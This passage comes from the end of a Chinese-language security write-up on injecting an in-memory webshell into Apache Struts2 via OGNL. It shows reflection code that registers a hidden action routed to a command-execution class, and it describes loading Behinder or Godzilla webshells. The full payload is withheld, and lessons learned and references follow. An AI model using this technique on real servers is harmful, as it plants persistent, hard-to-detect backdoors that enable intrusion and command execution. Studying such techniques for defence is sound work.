                    java.lang.reflect.Constructor constructor = Class.forName("com.opensymphony.xwork2.config.entities.ActionConfig").getDeclaredConstructor(new Class[]{String.class, String.class, String.class});
                    constructor.setAccessible(true);
                    java.util.LinkedHashMap o1 = (LinkedHashMap) obj5.get("");
                    o1.put("onlysecurity",  constructor.newInstance("f0ng", "onlysecurity", "com.demo.action.Cmd"));
                }catch (Exception e2) {
                }
            }catch (Exception e){
            }
        }
        public static void main(String[] args, java.util.Map obj5) throws Exception {
            hello aa = new hello(obj5);
        }
    }
编译成hello.class
那么把`java.net.URLClassLoader`的赋值增加一个`#this.class.getClassLoader()`，直接注内存马
如此丝滑！感谢su18师傅指导！
这里就不放payload了，把之前文章提及的payload进行赋值增加classloader即可。
顺带一提，这里base64的编码笔者是没有去变的，所以用的还是参考文章里struts2内存马里面的，这里如果要自定义类的话，可以使用poc2jar文件转码中的导出文件功能
保存完文件，拖到idea，直接能看到代码内容：
那么就可以注入冰蝎、哥斯拉等等方便操作的webshell了！  
再次感谢su18大佬提供的冰蝎马！
### 0x05 总结
  1. 内存马的知识了解甚少，一些基础知识需要去学习
  2. 不能根据所掌握的知识去攻击，应该去拓展自己的知识，如这里的struts2中的`#this`变量，之前是不知道的，当知道了以后，问题就迎刃而解了
  3. class.forName是取决于类加载器的，之前是URLClassloader加载器，会在其中寻找类，而又是通过file协议加载，所以会报出来classnotfound的错误
  4. 捕捉到异常后，new String(Arrays.toString(e.getStackTrace()))可以将详细报错捕捉到，这里用到了写入文件进行调试实例化类时遇到的报错问题，方法比较蠢，但是有效
#### 0x06 坑点
  1. 在`LinkedHashMap`对象赋值的时候，如果context是有后缀的，那么应该是obj5.get("")，没有后缀的话，那么就是obj5.get("/")
### 0x07 参考
>  【Struts2 的内存马】
>
> 
> 【Struts2的OGNL详解】
>
>  【Struts2
> 016环境】
>
> 
> 【struts2绕过waf读写文件及另类方式执行命令】